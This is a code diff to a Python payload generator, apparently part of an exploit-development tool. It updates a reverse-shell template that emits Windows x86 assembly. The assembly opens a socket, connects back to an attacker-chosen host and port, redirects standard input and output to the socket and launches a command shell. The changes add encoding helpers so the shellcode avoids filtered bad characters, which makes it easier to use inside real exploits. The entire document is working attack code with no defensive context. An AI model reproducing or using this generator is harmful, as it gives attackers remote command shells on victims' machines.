@@ -10,7 +10,12 @@ import socket
 import struct
 
 from .base import PayloadTemplate, TemplateConfig
-from ..encode import encode_dword, encode_word, safe_push_word_as_dword
+from ..encode import (
+    encode_dword, encode_word, safe_push_word_as_dword,
+    safe_push_imm, safe_dword_store, safe_word_store,
+    parse_ebp_offset, safe_lea, safe_mem_load, safe_mem_store,
+    safe_push_mem, safe_call_mem,
+)
 
 
 class ReverseShellTemplate(PayloadTemplate):
@@ -18,27 +23,28 @@ class ReverseShellTemplate(PayloadTemplate):
     def emit(self, layout, config: TemplateConfig) -> str:
         ip_le = struct.unpack("<I", socket.inet_aton(config.lhost))[0]
         port_be = socket.htons(config.lport)
+        bc = config.badchars
 
-        wsa_start = layout.slot("WSAStartup").ebp_ref
-        wsa_sock  = layout.slot("WSASocketA").ebp_ref
-        conn      = layout.slot("connect").ebp_ref
-        cpa       = layout.slot("CreateProcessA").ebp_ref
-        sock_h    = layout.slot("socket_handle").ebp_ref
-        wsadata   = layout.slot("WSADATA").ebp_ref
-        sockaddr  = layout.slot("sockaddr_in").ebp_ref
-        si        = layout.slot("STARTUPINFOA").ebp_ref
-        pi        = layout.slot("PROCESS_INFORMATION").ebp_ref
-        cmd       = layout.slot("cmd").ebp_ref
+        wsa_start_off = -layout.slot("WSAStartup").offset
+        wsa_sock_off  = -layout.slot("WSASocketA").offset
+        conn_off      = -layout.slot("connect").offset
+        cpa_off       = -layout.slot("CreateProcessA").offset
+        sock_h_off    = -layout.slot("socket_handle").offset
+        wsadata_off   = -layout.slot("WSADATA").offset
+        sockaddr_off  = -layout.slot("sockaddr_in").offset
+        si_off        = -layout.slot("STARTUPINFOA").offset
+        pi_off        = -layout.slot("PROCESS_INFORMATION").offset
+        cmd_off       = -layout.slot("cmd").offset
 
         return "\n".join([
             "; ── Reverse Shell Payload ─────────────────────────────────────────",
             f"; Target: {config.lhost}:{config.lport}",
             "",
             "    ; WSAStartup(0x0202, &WSADATA)",
-            f"    lea  esi, {wsadata}",
+            *safe_lea("esi", "ebp", wsadata_off, bc),
             "    push esi                    ; lpWSAData",
-            *safe_push_word_as_dword(0x0202, config.badchars),
-            f"    call dword ptr {wsa_start}",
+            *safe_push_word_as_dword(0x0202, bc),
+            *safe_call_mem("ebp", wsa_start_off, bc),
             "",
             "    ; WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, NULL, NULL)",
             "    xor  eax, eax",
@@ -51,35 +57,43 @@ class ReverseShellTemplate(PayloadTemplate):
             "    push eax                    ; type = SOCK_STREAM",
             "    inc  eax",
             "    push eax                    ; af = AF_INET",
-            f"    call dword ptr {wsa_sock}",
-            f"    mov  {sock_h}, eax         ; save SOCKET handle",
+            *safe_call_mem("ebp", wsa_sock_off, bc),
+            *safe_mem_store("ebp", sock_h_off, "eax", bc),
+            "    ; save SOCKET handle",
             "",
             "    ; Set STARTUPINFOA stdio handles to socket",
-            f"    mov  eax, {sock_h}",
-            f"    lea  edi, {si}",
-            "    mov  [edi+0x38], eax        ; hStdInput",
-            "    mov  [edi+0x3c], eax        ; hStdOutput",
-            "    mov  [edi+0x40], eax        ; hStdError",
+            *safe_mem_load("eax", "ebp", sock_h_off, bc),
+            *safe_lea("edi", "ebp", si_off, bc),
+            *safe_dword_store("edi", 0x38, "eax", bc, tmp="ecx"),
+            "    ; hStdInput",
+            *safe_dword_store("edi", 0x3c, "eax", bc, tmp="ecx"),
+            "    ; hStdOutput",
+            *safe_dword_store("edi", 0x40, "eax", bc, tmp="ecx"),
+            "    ; hStdError",
             "",
             "    ; Set sockaddr_in address and port",
-            f"    lea  edi, {sockaddr}",
+            *safe_lea("edi", "ebp", sockaddr_off, bc),
             "    xor  eax, eax",
-            *encode_word(port_be, config.badchars, "ax"),
-            "    mov  word ptr [edi+0x02], ax   ; sin_port (big-endian)",
-            *encode_dword(ip_le, config.badchars, "eax"),
-            "    mov  dword ptr [edi+0x04], eax ; sin_addr (network order)",
+            *encode_word(port_be, bc, "ax"),
+            *safe_word_store("edi", 0x02, "ax", bc, tmp="ecx"),
+            "    ; sin_port (big-endian)",
+            *encode_dword(ip_le, bc, "eax"),
+            *safe_dword_store("edi", 0x04, "eax", bc, tmp="ecx"),
+            "    ; sin_addr (network order)",
             "",
             "    ; connect(socket, &sockaddr_in, 0x10)",
-            f"    lea  eax, {sockaddr}",
-            "    push 0x10                   ; namelen",
+            *safe_lea("eax", "ebp", sockaddr_off, bc),
+            *safe_push_imm(0x10, bc),
+            "    ; namelen",
             "    push eax                    ; name = &sockaddr_in",
-            f"    push dword ptr {sock_h}    ; socket handle",
-            f"    call dword ptr {conn}",
+            *safe_push_mem("ebp", sock_h_off, bc),
+            "    ; socket handle",
+            *safe_call_mem("ebp", conn_off, bc),
             "",
             "    ; CreateProcessA(NULL, &cmd, NULL, NULL, TRUE, NULL, NULL, NULL, &si, &pi)",
-            f"    lea  esi, {cmd}",
-            f"    lea  edi, {si}",
-            f"    lea  ebx, {pi}",
+            *safe_lea("esi", "ebp", cmd_off, bc),
+            *safe_lea("edi", "ebp", si_off, bc),
+            *safe_lea("ebx", "ebp", pi_off, bc),
             "    xor  eax, eax",
             "    push ebx                    ; lpProcessInformation",
             "    push edi                    ; lpStartupInfo",
@@ -93,7 +107,7 @@ class ReverseShellTemplate(PayloadTemplate):
             "    push eax                    ; lpProcessAttributes = NULL",
             "    push esi                    ; lpCommandLine = &cmd",
             "    push eax                    ; lpApplicationName = NULL",
-            f"    call dword ptr {cpa}",
+            *safe_call_mem("ebp", cpa_off, bc),
             "",
         ])
 
